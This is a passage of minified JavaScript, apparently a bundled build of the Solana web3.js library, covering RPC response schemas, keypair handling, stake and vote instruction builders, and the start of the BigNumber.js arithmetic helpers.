r;try{r=t.layout.decode(e)}catch(t){throw new Error("invalid instruction; "+t)}if(r.typeIndex!==t.index)throw new Error(`invalid account data; account type mismatch ${r.typeIndex} != ${t.index}`);return r}(ri,t),r=t.length-56;wn(r>=0,"lookup table is invalid"),wn(r%32==0,"lookup table is invalid");const n=r/32,{addresses:i}=Ie.w3([Ie.O6(dn(),n,"addresses")]).decode(t.slice(56));return{deactivationSlot:e.deactivationSlot,lastExtendedSlot:e.lastExtendedSlot,lastExtendedSlotStartIndex:e.lastExtendedStartIndex,authority:0!==e.authority.length?new an(e.authority[0]):void 0,addresses:i.map((t=>new an(t)))}}}const ri={index:1,layout:Ie.w3([Ie.DH("typeIndex"),qn("deactivationSlot"),Ie.I0("lastExtendedSlot"),Ie.u8("lastExtendedStartIndex"),Ie.u8(),Ie.O6(dn(),Ie.cY(Ie.u8(),-1),"authority")])},ni=/^[^:]+:\/\/([^:[]+|\[[^\]]+\])(:\d+)?(.*)/i,ii=tr(Fe(an),Je(),(t=>new an(t))),oi=Ze([Je(),He("base64")]),si=tr(Fe(n.Buffer),oi,(t=>n.Buffer.from(t[0],"base64")));function ai(t){let e,r;if("string"==typeof t)e=t;else if(t){const{commitment:n,...i}=t;e=n,r=i}return{commitment:e,config:r}}function ci(t){return t.map((t=>"memcmp"in t?{...t,memcmp:{...t.memcmp,encoding:t.memcmp.encoding??"base58"}}:t))}function ui(t){return Xe([Ye({jsonrpc:He("2.0"),id:Je(),result:t}),Ye({jsonrpc:He("2.0"),id:Je(),error:Ye({code:Qe(),message:Je(),data:Ve(je("any",(()=>!0)))})})])}const hi=ui(Qe());function li(t){return tr(ui(t),hi,(e=>"error"in e?e:{...e,result:Ue(e.result,t)}))}function fi(t){return li(Ye({context:Ye({slot:$e()}),value:t}))}function di(t){return Ye({context:Ye({slot:$e()}),value:t})}function pi(t,e){return 0===t?new En({header:e.header,staticAccountKeys:e.accountKeys.map((t=>new an(t))),recentBlockhash:e.recentBlockhash,compiledInstructions:e.instructions.map((t=>({programIdIndex:t.programIdIndex,accountKeyIndexes:t.accounts,data:ae().decode(t.data)}))),addressTableLookups:e.addressTableLookups}):new An(e)}const gi=Ye({foundation:$e(),foundationTerm:$e(),initial:$e(),taper:$e(),terminal:$e()}),mi=li(We(Ke(Ye({epoch:$e(),effectiveSlot:$e(),amount:$e(),postBalance:$e(),commission:Ve(Ke($e()))})))),yi=We(Ye({slot:$e(),prioritizationFee:$e()})),wi=Ye({total:$e(),validator:$e(),foundation:$e(),epoch:$e()}),bi=Ye({epoch:$e(),slotIndex:$e(),slotsInEpoch:$e(),absoluteSlot:$e(),blockHeight:Ve($e()),transactionCount:Ve($e())}),vi=Ye({slotsPerEpoch:$e(),leaderScheduleSlotOffset:$e(),warmup:qe(),firstNormalEpoch:$e(),firstNormalSlot:$e()}),ki=Ge(Je(),We($e())),Si=Ke(Xe([Ye({}),Je()])),Ai=Ye({err:Si}),Ei=He("receivedSignature"),_i=Ye({"solana-core":Je(),"feature-set":Ve($e())}),Bi=Ye({program:Je(),programId:ii,parsed:Qe()}),Ii=Ye({programId:ii,accounts:We(ii),data:Je()}),xi=fi(Ye({err:Ke(Xe([Ye({}),Je()])),logs:Ke(We(Je())),accounts:Ve(Ke(We(Ke(Ye({executable:qe(),owner:Je(),lamports:$e(),data:We(Je()),rentEpoch:Ve($e())}))))),unitsConsumed:Ve($e()),returnData:Ve(Ke(Ye({programId:Je(),data:Ze([Je(),He("base64")])}))),innerInstructions:Ve(Ke(We(Ye({index:$e(),instructions:We(Xe([Bi,Ii]))}))))})),Mi=fi(Ye({byIdentity:Ge(Je(),We($e())),range:Ye({firstSlot:$e(),lastSlot:$e()})})),Oi=li(gi),Ti=li(wi),Ri=li(yi),Pi=li(bi),Ci=li(vi),Li=li(ki),Ni=li($e()),Ui=fi(Ye({total:$e(),circulating:$e(),nonCirculating:$e(),nonCirculatingAccounts:We(ii)})),zi=Ye({amount:Je(),uiAmount:Ke($e()),decimals:$e(),uiAmountString:Ve(Je())}),Di=fi(We(Ye({address:ii,amount:Je(),uiAmount:Ke($e()),decimals:$e(),uiAmountString:Ve(Je())}))),ji=fi(We(Ye({pubkey:ii,account:Ye({executable:qe(),owner:ii,lamports:$e(),data:si,rentEpoch:$e()})}))),Wi=Ye({program:Je(),parsed:Qe(),space:$e()}),qi=fi(We(Ye({pubkey:ii,account:Ye({executable:qe(),owner:ii,lamports:$e(),data:Wi,rentEpoch:$e()})}))),Fi=fi(We(Ye({lamports:$e(),address:ii}))),Hi=Ye({executable:qe(),owner:ii,lamports:$e(),data:si,rentEpoch:$e()}),Ki=Ye({pubkey:ii,account:Hi}),$i=tr(Xe([Fe(n.Buffer),Wi]),Xe([oi,Wi]),(t=>Array.isArray(t)?Ue(t,si):t)),Vi=Ye({executable:qe(),owner:ii,lamports:$e(),data:$i,rentEpoch:$e()}),Gi=Ye({pubkey:ii,account:Vi}),Ji=Ye({state:Xe([He("active"),He("inactive"),He("activating"),He("deactivating")]),active:$e(),inactive:$e()}),Zi=li(We(Ye({signature:Je(),slot:$e(),err:Si,memo:Ke(Je()),blockTime:Ve(Ke($e()))}))),Yi=li(We(Ye({signature:Je(),slot:$e(),err:Si,memo:Ke(Je()),blockTime:Ve(Ke($e()))}))),Xi=Ye({subscription:$e(),result:di(Hi)}),Qi=Ye({pubkey:ii,account:Hi}),to=Ye({subscription:$e(),result:di(Qi)}),eo=Ye({parent:$e(),slot:$e(),root:$e()}),ro=Ye({subscription:$e(),result:eo}),no=Xe([Ye({type:Xe([He("firstShredReceived"),He("completed"),He("optimisticConfirmation"),He("root")]),slot:$e(),timestamp:$e()}),Ye({type:He("createdBank"),parent:$e(),slot:$e(),timestamp:$e()}),Ye({type:He("frozen"),slot:$e(),timestamp:$e(),stats:Ye({numTransactionEntries:$e(),numSuccessfulTransactions:$e(),numFailedTransactions:$e(),maxTransactionsPerEntry:$e()})}),Ye({type:He("dead"),slot:$e(),timestamp:$e(),err:Je()})]),io=Ye({subscription:$e(),result:no}),oo=Ye({subscription:$e(),result:di(Xe([Ai,Ei]))}),so=Ye({subscription:$e(),result:$e()}),ao=Ye({pubkey:Je(),gossip:Ke(Je()),tpu:Ke(Je()),rpc:Ke(Je()),version:Ke(Je())}),co=Ye({votePubkey:Je(),nodePubkey:Je(),activatedStake:$e(),epochVoteAccount:qe(),epochCredits:We(Ze([$e(),$e(),$e()])),commission:$e(),lastVote:$e(),rootSlot:Ke($e())}),uo=li(Ye({current:We(co),delinquent:We(co)})),ho=Xe([He("processed"),He("confirmed"),He("finalized")]),lo=Ye({slot:$e(),confirmations:Ke($e()),err:Si,confirmationStatus:Ve(ho)}),fo=fi(We(Ke(lo))),po=li($e()),go=Ye({accountKey:ii,writableIndexes:We($e()),readonlyIndexes:We($e())}),mo=Ye({signatures:We(Je()),message:Ye({accountKeys:We(Je()),header:Ye({numRequiredSignatures:$e(),numReadonlySignedAccounts:$e(),numReadonlyUnsignedAccounts:$e()}),instructions:We(Ye({accounts:We($e()),data:Je(),programIdIndex:$e()})),recentBlockhash:Je(),addressTableLookups:Ve(We(go))})}),yo=Ye({pubkey:ii,signer:qe(),writable:qe(),source:Ve(Xe([He("transaction"),He("lookupTable")]))}),wo=Ye({accountKeys:We(yo),signatures:We(Je())}),bo=Ye({parsed:Qe(),program:Je(),programId:ii}),vo=Ye({accounts:We(ii),data:Je(),programId:ii}),ko=tr(Xe([vo,bo]),Xe([Ye({parsed:Qe(),program:Je(),programId:Je()}),Ye({accounts:We(Je()),data:Je(),programId:Je()})]),(t=>Ue(t,"accounts"in t?vo:bo))),So=Ye({signatures:We(Je()),message:Ye({accountKeys:We(yo),instructions:We(ko),recentBlockhash:Je(),addressTableLookups:Ve(Ke(We(go)))})}),Ao=Ye({accountIndex:$e(),mint:Je(),owner:Ve(Je()),programId:Ve(Je()),uiTokenAmount:zi}),Eo=Ye({writable:We(ii),readonly:We(ii)}),_o=Ye({err:Si,fee:$e(),innerInstructions:Ve(Ke(We(Ye({index:$e(),instructions:We(Ye({accounts:We($e()),data:Je(),programIdIndex:$e()}))})))),preBalances:We($e()),postBalances:We($e()),logMessages:Ve(Ke(We(Je()))),preTokenBalances:Ve(Ke(We(Ao))),postTokenBalances:Ve(Ke(We(Ao))),loadedAddresses:Ve(Eo),computeUnitsConsumed:Ve($e())}),Bo=Ye({err:Si,fee:$e(),innerInstructions:Ve(Ke(We(Ye({index:$e(),instructions:We(ko)})))),preBalances:We($e()),postBalances:We($e()),logMessages:Ve(Ke(We(Je()))),preTokenBalances:Ve(Ke(We(Ao))),postTokenBalances:Ve(Ke(We(Ao))),loadedAddresses:Ve(Eo),computeUnitsConsumed:Ve($e())}),Io=Xe([He(0),He("legacy")]),xo=Ye({pubkey:Je(),lamports:$e(),postBalance:Ke($e()),rewardType:Ke(Je()),commission:Ve(Ke($e()))}),Mo=li(Ke(Ye({blockhash:Je(),previousBlockhash:Je(),parentSlot:$e(),transactions:We(Ye({transaction:mo,meta:Ke(_o),version:Ve(Io)})),rewards:Ve(We(xo)),blockTime:Ke($e()),blockHeight:Ke($e())}))),Oo=li(Ke(Ye({blockhash:Je(),previousBlockhash:Je(),parentSlot:$e(),rewards:Ve(We(xo)),blockTime:Ke($e()),blockHeight:Ke($e())}))),To=li(Ke(Ye({blockhash:Je(),previousBlockhash:Je(),parentSlot:$e(),transactions:We(Ye({transaction:wo,meta:Ke(_o),version:Ve(Io)})),rewards:Ve(We(xo)),blockTime:Ke($e()),blockHeight:Ke($e())}))),Ro=li(Ke(Ye({blockhash:Je(),previousBlockhash:Je(),parentSlot:$e(),transactions:We(Ye({transaction:So,meta:Ke(Bo),version:Ve(Io)})),rewards:Ve(We(xo)),blockTime:Ke($e()),blockHeight:Ke($e())}))),Po=li(Ke(Ye({blockhash:Je(),previousBlockhash:Je(),parentSlot:$e(),transactions:We(Ye({transaction:wo,meta:Ke(Bo),version:Ve(Io)})),rewards:Ve(We(xo)),blockTime:Ke($e()),blockHeight:Ke($e())}))),Co=li(Ke(Ye({blockhash:Je(),previousBlockhash:Je(),parentSlot:$e(),rewards:Ve(We(xo)),blockTime:Ke($e()),blockHeight:Ke($e())}))),Lo=li(Ke(Ye({blockhash:Je(),previousBlockhash:Je(),parentSlot:$e(),transactions:We(Ye({transaction:mo,meta:Ke(_o)})),rewards:Ve(We(xo)),blockTime:Ke($e())}))),No=li(Ke(Ye({blockhash:Je(),previousBlockhash:Je(),parentSlot:$e(),signatures:We(Je()),blockTime:Ke($e())}))),Uo=li(Ke(Ye({slot:$e(),meta:Ke(_o),blockTime:Ve(Ke($e())),transaction:mo,version:Ve(Io)}))),zo=li(Ke(Ye({slot:$e(),transaction:So,meta:Ke(Bo),blockTime:Ve(Ke($e())),version:Ve(Io)}))),Do=fi(Ye({blockhash:Je(),lastValidBlockHeight:$e()})),jo=fi(qe()),Wo=li(We(Ye({slot:$e(),numTransactions:$e(),numSlots:$e(),samplePeriodSecs:$e()}))),qo=fi(Ke(Ye({feeCalculator:Ye({lamportsPerSignature:$e()})}))),Fo=li(Je()),Ho=li(Je()),Ko=Ye({err:Si,logs:We(Je()),signature:Je()}),$o=Ye({result:di(Ko),subscription:$e()}),Vo={"solana-client":"js/1.0.0-maintenance"};class Go{constructor(t){this._keypair=void 0,this._keypair=t??Jr()}static generate(){return new Go(Jr())}static fromSecretKey(t,e){if(64!==t.byteLength)throw new Error("bad secret key size");const r=t.slice(32,64);if(!e||!e.skipValidation){const e=t.slice(0,32),n=Zr(e);for(let t=0;t<32;t++)if(r[t]!==n[t])throw new Error("provided secretKey is invalid")}return new Go({publicKey:r,secretKey:t})}static fromSeed(t){const e=Zr(t),r=new Uint8Array(64);return r.set(t),r.set(e,32),new Go({publicKey:e,secretKey:r})}get publicKey(){return new an(this._keypair.publicKey)}get secretKey(){return new Uint8Array(this._keypair.secretKey)}}Object.freeze({CreateLookupTable:{index:0,layout:Ie.w3([Ie.DH("instruction"),qn("recentSlot"),Ie.u8("bumpSeed")])},FreezeLookupTable:{index:1,layout:Ie.w3([Ie.DH("instruction")])},ExtendLookupTable:{index:2,layout:Ie.w3([Ie.DH("instruction"),qn(),Ie.O6(dn(),Ie.cY(Ie.DH(),-8),"addresses")])},DeactivateLookupTable:{index:3,layout:Ie.w3([Ie.DH("instruction")])},CloseLookupTable:{index:4,layout:Ie.w3([Ie.DH("instruction")])}});new an("AddressLookupTab1e1111111111111111111111111");Object.freeze({RequestUnits:{index:0,layout:Ie.w3([Ie.u8("instruction"),Ie.DH("units"),Ie.DH("additionalFee")])},RequestHeapFrame:{index:1,layout:Ie.w3([Ie.u8("instruction"),Ie.DH("bytes")])},SetComputeUnitLimit:{index:2,layout:Ie.w3([Ie.u8("instruction"),Ie.DH("units")])},SetComputeUnitPrice:{index:3,layout:Ie.w3([Ie.u8("instruction"),qn("microLamports")])}});new an("ComputeBudget111111111111111111111111111111");const Jo=Ie.w3([Ie.u8("numSignatures"),Ie.u8("padding"),Ie.NX("signatureOffset"),Ie.NX("signatureInstructionIndex"),Ie.NX("publicKeyOffset"),Ie.NX("publicKeyInstructionIndex"),Ie.NX("messageDataOffset"),Ie.NX("messageDataSize"),Ie.NX("messageInstructionIndex")]);class Zo{constructor(){}static createInstructionWithPublicKey(t){const{publicKey:e,message:r,signature:i,instructionIndex:o}=t;wn(32===e.length,`Public Key must be 32 bytes but received ${e.length} bytes`),wn(64===i.length,`Signature must be 64 bytes but received ${i.length} bytes`);const s=Jo.span,a=s+e.length,c=a+i.length,u=n.Buffer.alloc(c+r.length),h=null==o?65535:o;return Jo.encode({numSignatures:1,padding:0,signatureOffset:a,signatureInstructionIndex:h,publicKeyOffset:s,publicKeyInstructionIndex:h,messageDataOffset:c,messageDataSize:r.length,messageInstructionIndex:h},u),u.fill(e,s),u.fill(i,a),u.fill(r,c),new In({keys:[],programId:Zo.programId,data:u})}static createInstructionWithPrivateKey(t){const{privateKey:e,message:r,instructionIndex:n}=t;wn(64===e.length,`Private key must be 64 bytes but received ${e.length} bytes`);try{const t=Go.fromSecretKey(e),i=t.publicKey.toBytes(),o=Xr(r,t.secretKey);return this.createInstructionWithPublicKey({publicKey:i,message:r,signature:o,instructionIndex:n})}catch(t){throw new Error(`Error creating instruction; ${t}`)}}}Zo.programId=new an("Ed25519SigVerify111111111111111111111111111"),Gr.utils.isValidPrivateKey;const Yo=Gr.getPublicKey,Xo=Ie.w3([Ie.u8("numSignatures"),Ie.NX("signatureOffset"),Ie.u8("signatureInstructionIndex"),Ie.NX("ethAddressOffset"),Ie.u8("ethAddressInstructionIndex"),Ie.NX("messageDataOffset"),Ie.NX("messageDataSize"),Ie.u8("messageInstructionIndex"),Ie.av(20,"ethAddress"),Ie.av(64,"signature"),Ie.u8("recoveryId")]);class Qo{constructor(){}static publicKeyToEthAddress(t){wn(64===t.length,`Public key must be 64 bytes but received ${t.length} bytes`);try{return n.Buffer.from(_r(tn(t))).slice(-20)}catch(t){throw new Error(`Error constructing Ethereum address: ${t}`)}}static createInstructionWithPublicKey(t){const{publicKey:e,message:r,signature:n,recoveryId:i,instructionIndex:o}=t;return Qo.createInstructionWithEthAddress({ethAddress:Qo.publicKeyToEthAddress(e),message:r,signature:n,recoveryId:i,instructionIndex:o})}static createInstructionWithEthAddress(t){const{ethAddress:e,message:r,signature:i,recoveryId:o,instructionIndex:s=0}=t;let a;a="string"==typeof e?e.startsWith("0x")?n.Buffer.from(e.substr(2),"hex"):n.Buffer.from(e,"hex"):e,wn(20===a.length,`Address must be 20 bytes but received ${a.length} bytes`);const c=12+a.length,u=c+i.length+1,h=n.Buffer.alloc(Xo.span+r.length);return Xo.encode({numSignatures:1,signatureOffset:c,signatureInstructionIndex:s,ethAddressOffset:12,ethAddressInstructionIndex:s,messageDataOffset:u,messageDataSize:r.length,messageInstructionIndex:s,signature:tn(i),ethAddress:tn(a),recoveryId:o},h),h.fill(tn(r),Xo.span),new In({keys:[],programId:Qo.programId,data:h})}static createInstructionWithPrivateKey(t){const{privateKey:e,message:r,instructionIndex:i}=t;wn(32===e.length,`Private key must be 32 bytes but received ${e.length} bytes`);try{const t=tn(e),o=Yo(t,!1).slice(1),s=n.Buffer.from(_r(tn(r))),[a,c]=((t,e)=>{const r=Gr.sign(t,e);return[r.toCompactRawBytes(),r.recovery]})(s,t);return this.createInstructionWithPublicKey({publicKey:o,message:r,signature:a,recoveryId:c,instructionIndex:i})}catch(t){throw new Error(`Error creating instruction; ${t}`)}}}var ts;Qo.programId=new an("KeccakSecp256k11111111111111111111111111111");const es=new an("StakeConfig11111111111111111111111111111111");class rs{constructor(t,e,r){this.unixTimestamp=void 0,this.epoch=void 0,this.custodian=void 0,this.unixTimestamp=t,this.epoch=e,this.custodian=r}}ts=rs,rs.default=new ts(0,0,an.default);const ns=Object.freeze({Initialize:{index:0,layout:Ie.w3([Ie.DH("instruction"),((t="authorized")=>Ie.w3([dn("staker"),dn("withdrawer")],t))(),((t="lockup")=>Ie.w3([Ie.Wg("unixTimestamp"),Ie.Wg("epoch"),dn("custodian")],t))()])},Authorize:{index:1,layout:Ie.w3([Ie.DH("instruction"),dn("newAuthorized"),Ie.DH("stakeAuthorizationType")])},Delegate:{index:2,layout:Ie.w3([Ie.DH("instruction")])},Split:{index:3,layout:Ie.w3([Ie.DH("instruction"),Ie.Wg("lamports")])},Withdraw:{index:4,layout:Ie.w3([Ie.DH("instruction"),Ie.Wg("lamports")])},Deactivate:{index:5,layout:Ie.w3([Ie.DH("instruction")])},Merge:{index:7,layout:Ie.w3([Ie.DH("instruction")])},AuthorizeWithSeed:{index:8,layout:Ie.w3([Ie.DH("instruction"),dn("newAuthorized"),Ie.DH("stakeAuthorizationType"),pn("authoritySeed"),dn("authorityOwner")])}});Object.freeze({Staker:{index:0},Withdrawer:{index:1}});class is{constructor(){}static initialize(t){const{stakePubkey:e,authorized:r,lockup:n}=t,i=n||rs.default,o=Un(ns.Initialize,{authorized:{staker:tn(r.staker.toBuffer()),withdrawer:tn(r.withdrawer.toBuffer())},lockup:{unixTimestamp:i.unixTimestamp,epoch:i.epoch,custodian:tn(i.custodian.toBuffer())}}),s={keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:Tn,isSigner:!1,isWritable:!1}],programId:this.programId,data:o};return new In(s)}static createAccountWithSeed(t){const e=new xn;e.add(Hn.createAccountWithSeed({fromPubkey:t.fromPubkey,newAccountPubkey:t.stakePubkey,basePubkey:t.basePubkey,seed:t.seed,lamports:t.lamports,space:this.space,programId:this.programId}));const{stakePubkey:r,authorized:n,lockup:i}=t;return e.add(this.initialize({stakePubkey:r,authorized:n,lockup:i}))}static createAccount(t){const e=new xn;e.add(Hn.createAccount({fromPubkey:t.fromPubkey,newAccountPubkey:t.stakePubkey,lamports:t.lamports,space:this.space,programId:this.programId}));const{stakePubkey:r,authorized:n,lockup:i}=t;return e.add(this.initialize({stakePubkey:r,authorized:n,lockup:i}))}static delegate(t){const{stakePubkey:e,authorizedPubkey:r,votePubkey:n}=t,i=Un(ns.Delegate);return(new xn).add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:n,isSigner:!1,isWritable:!1},{pubkey:Mn,isSigner:!1,isWritable:!1},{pubkey:Rn,isSigner:!1,isWritable:!1},{pubkey:es,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:i})}static authorize(t){const{stakePubkey:e,authorizedPubkey:r,newAuthorizedPubkey:n,stakeAuthorizationType:i,custodianPubkey:o}=t,s=Un(ns.Authorize,{newAuthorized:tn(n.toBuffer()),stakeAuthorizationType:i.index}),a=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:Mn,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!0,isWritable:!1}];return o&&a.push({pubkey:o,isSigner:!0,isWritable:!1}),(new xn).add({keys:a,programId:this.programId,data:s})}static authorizeWithSeed(t){const{stakePubkey:e,authorityBase:r,authoritySeed:n,authorityOwner:i,newAuthorizedPubkey:o,stakeAuthorizationType:s,custodianPubkey:a}=t,c=Un(ns.AuthorizeWithSeed,{newAuthorized:tn(o.toBuffer()),stakeAuthorizationType:s.index,authoritySeed:n,authorityOwner:tn(i.toBuffer())}),u=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!0,isWritable:!1},{pubkey:Mn,isSigner:!1,isWritable:!1}];return a&&u.push({pubkey:a,isSigner:!0,isWritable:!1}),(new xn).add({keys:u,programId:this.programId,data:c})}static splitInstruction(t){const{stakePubkey:e,authorizedPubkey:r,splitStakePubkey:n,lamports:i}=t,o=Un(ns.Split,{lamports:i});return new In({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:n,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:o})}static split(t,e){const r=new xn;return r.add(Hn.createAccount({fromPubkey:t.authorizedPubkey,newAccountPubkey:t.splitStakePubkey,lamports:e,space:this.space,programId:this.programId})),r.add(this.splitInstruction(t))}static splitWithSeed(t,e){const{stakePubkey:r,authorizedPubkey:n,splitStakePubkey:i,basePubkey:o,seed:s,lamports:a}=t,c=new xn;return c.add(Hn.allocate({accountPubkey:i,basePubkey:o,seed:s,space:this.space,programId:this.programId})),e&&e>0&&c.add(Hn.transfer({fromPubkey:t.authorizedPubkey,toPubkey:i,lamports:e})),c.add(this.splitInstruction({stakePubkey:r,authorizedPubkey:n,splitStakePubkey:i,lamports:a}))}static merge(t){const{stakePubkey:e,sourceStakePubKey:r,authorizedPubkey:n}=t,i=Un(ns.Merge);return(new xn).add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!1,isWritable:!0},{pubkey:Mn,isSigner:!1,isWritable:!1},{pubkey:Rn,isSigner:!1,isWritable:!1},{pubkey:n,isSigner:!0,isWritable:!1}],programId:this.programId,data:i})}static withdraw(t){const{stakePubkey:e,authorizedPubkey:r,toPubkey:n,lamports:i,custodianPubkey:o}=t,s=Un(ns.Withdraw,{lamports:i}),a=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:n,isSigner:!1,isWritable:!0},{pubkey:Mn,isSigner:!1,isWritable:!1},{pubkey:Rn,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}];return o&&a.push({pubkey:o,isSigner:!0,isWritable:!1}),(new xn).add({keys:a,programId:this.programId,data:s})}static deactivate(t){const{stakePubkey:e,authorizedPubkey:r}=t,n=Un(ns.Deactivate);return(new xn).add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:Mn,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:n})}}is.programId=new an("Stake11111111111111111111111111111111111111"),is.space=200;const os=Object.freeze({InitializeAccount:{index:0,layout:Ie.w3([Ie.DH("instruction"),((t="voteInit")=>Ie.w3([dn("nodePubkey"),dn("authorizedVoter"),dn("authorizedWithdrawer"),Ie.u8("commission")],t))()])},Authorize:{index:1,layout:Ie.w3([Ie.DH("instruction"),dn("newAuthorized"),Ie.DH("voteAuthorizationType")])},Withdraw:{index:3,layout:Ie.w3([Ie.DH("instruction"),Ie.Wg("lamports")])},UpdateValidatorIdentity:{index:4,layout:Ie.w3([Ie.DH("instruction")])},AuthorizeWithSeed:{index:10,layout:Ie.w3([Ie.DH("instruction"),((t="voteAuthorizeWithSeedArgs")=>Ie.w3([Ie.DH("voteAuthorizationType"),dn("currentAuthorityDerivedKeyOwnerPubkey"),pn("currentAuthorityDerivedKeySeed"),dn("newAuthorized")],t))()])}});Object.freeze({Voter:{index:0},Withdrawer:{index:1}});class ss{constructor(){}static initializeAccount(t){const{votePubkey:e,nodePubkey:r,voteInit:n}=t,i=Un(os.InitializeAccount,{voteInit:{nodePubkey:tn(n.nodePubkey.toBuffer()),authorizedVoter:tn(n.authorizedVoter.toBuffer()),authorizedWithdrawer:tn(n.authorizedWithdrawer.toBuffer()),commission:n.commission}}),o={keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:Tn,isSigner:!1,isWritable:!1},{pubkey:Mn,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:i};return new In(o)}static createAccount(t){const e=new xn;return e.add(Hn.createAccount({fromPubkey:t.fromPubkey,newAccountPubkey:t.votePubkey,lamports:t.lamports,space:this.space,programId:this.programId})),e.add(this.initializeAccount({votePubkey:t.votePubkey,nodePubkey:t.voteInit.nodePubkey,voteInit:t.voteInit}))}static authorize(t){const{votePubkey:e,authorizedPubkey:r,newAuthorizedPubkey:n,voteAuthorizationType:i}=t,o=Un(os.Authorize,{newAuthorized:tn(n.toBuffer()),voteAuthorizationType:i.index}),s=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:Mn,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}];return(new xn).add({keys:s,programId:this.programId,data:o})}static authorizeWithSeed(t){const{currentAuthorityDerivedKeyBasePubkey:e,currentAuthorityDerivedKeyOwnerPubkey:r,currentAuthorityDerivedKeySeed:n,newAuthorizedPubkey:i,voteAuthorizationType:o,votePubkey:s}=t,a=Un(os.AuthorizeWithSeed,{voteAuthorizeWithSeedArgs:{currentAuthorityDerivedKeyOwnerPubkey:tn(r.toBuffer()),currentAuthorityDerivedKeySeed:n,newAuthorized:tn(i.toBuffer()),voteAuthorizationType:o.index}}),c=[{pubkey:s,isSigner:!1,isWritable:!0},{pubkey:Mn,isSigner:!1,isWritable:!1},{pubkey:e,isSigner:!0,isWritable:!1}];return(new xn).add({keys:c,programId:this.programId,data:a})}static withdraw(t){const{votePubkey:e,authorizedWithdrawerPubkey:r,lamports:n,toPubkey:i}=t,o=Un(os.Withdraw,{lamports:n}),s=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:i,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!0,isWritable:!1}];return(new xn).add({keys:s,programId:this.programId,data:o})}static safeWithdraw(t,e,r){if(t.lamports>e-r)throw new Error("Withdraw will leave vote account with insufficient funds.");return ss.withdraw(t)}static updateValidatorIdentity(t){const{votePubkey:e,authorizedWithdrawerPubkey:r,nodePubkey:n}=t,i=Un(os.UpdateValidatorIdentity),o=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:n,isSigner:!0,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}];return(new xn).add({keys:o,programId:this.programId,data:i})}}ss.programId=new an("Vote111111111111111111111111111111111111111"),ss.space=3762,new an("Va1idator1nfo111111111111111111111111111111"),Ye({name:Je(),website:Ve(Je()),details:Ve(Je()),iconUrl:Ve(Je()),keybaseUsername:Ve(Je())}),new an("Vote111111111111111111111111111111111111111"),Ie.w3([dn("nodePubkey"),dn("authorizedWithdrawer"),Ie.u8("commission"),Ie.I0(),Ie.O6(Ie.w3([Ie.I0("slot"),Ie.DH("confirmationCount")]),Ie.cY(Ie.DH(),-8),"votes"),Ie.u8("rootSlotValid"),Ie.I0("rootSlot"),Ie.I0(),Ie.O6(Ie.w3([Ie.I0("epoch"),dn("authorizedVoter")]),Ie.cY(Ie.DH(),-8),"authorizedVoters"),Ie.w3([Ie.O6(Ie.w3([dn("authorizedPubkey"),Ie.I0("epochOfLastAuthorizedSwitch"),Ie.I0("targetEpoch")]),32,"buf"),Ie.I0("idx"),Ie.u8("isEmpty")],"priorVoters"),Ie.I0(),Ie.O6(Ie.w3([Ie.I0("epoch"),Ie.I0("credits"),Ie.I0("prevCredits")]),Ie.cY(Ie.DH(),-8),"epochCredits"),Ie.w3([Ie.I0("slot"),Ie.I0("timestamp")],"lastTimestamp")]);const as=t=>({decode:t.decode.bind(t),encode:t.encode.bind(t)});var cs=r(287).Buffer;const us=t=>e=>{const r=(0,Ie.av)(t,e),{encode:n,decode:i}=as(r),o=r;return o.decode=(t,e)=>{const r=i(t,e);return(0,xe.k5)(cs.from(r))},o.encode=(e,r,i)=>{const o=(0,xe.Bq)(e,t);return n(o,r,i)},o},hs=t=>e=>{const r=(0,Ie.av)(t,e),{encode:n,decode:i}=as(r),o=r;return o.decode=(t,e)=>{const r=i(t,e);return(0,xe.cI)(cs.from(r))},o.encode=(e,r,i)=>{const o=(0,xe.zy)(e,t);return n(o,r,i)},o},ls=us(8);hs(8),us(16),hs(16),us(24),hs(24),us(32),hs(32);var fs=/^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,ds=Math.ceil,ps=Math.floor,gs="[BigNumber Error] ",ms=gs+"Number primitive has more than 15 significant digits: ",ys=1e14,ws=14,bs=9007199254740991,vs=[1,10,100,1e3,1e4,1e5,1e6,1e7,1e8,1e9,1e10,1e11,1e12,1e13],ks=1e7,Ss=1e9;function As(t){var e=0|t;return t>0||t===e?e:e-1}function Es(t){for(var e,r,n=1,i=t.length,o=t[0]+"";n<i;){for(e=t[n++]+"",r=ws-e.length;r--;e="0"+e);o+=e}for(i=o.length;48===o.charCodeAt(--i););return o.slice(0,i+1||1)}function _s(t,e){var r,n,i=t.c,o=e.c,s=t.s,a=e.s,c=t.e,u=e.e;if(!s||!a)return null;if(r=i&&!i[0],n=o&&!o[0],r||n)return r?n?0:-a:s;if(s!=a)return s;if(r=s<0,n=c==u,!i||!o)return n?0:!i^r?1:-1;if(!n)return c>u^r?1:-1;for(a=(c=i.length)<(u=o.length)?c:u,s=0;s<a;s++)if(i[s]!=o[s])return i[s]>o[s]^r?1:-1;return c==u?0:c>u^r?1:-1}function Bs(t,e,r,n){if(t<e||t>r||t!==ps(t))throw Error(gs+(n||"Argument")+("number"==typeof t?t<e||t>r?" out of range: ":" not an integer: ":" not a primitive number: ")+String(t))}function Is(t){var 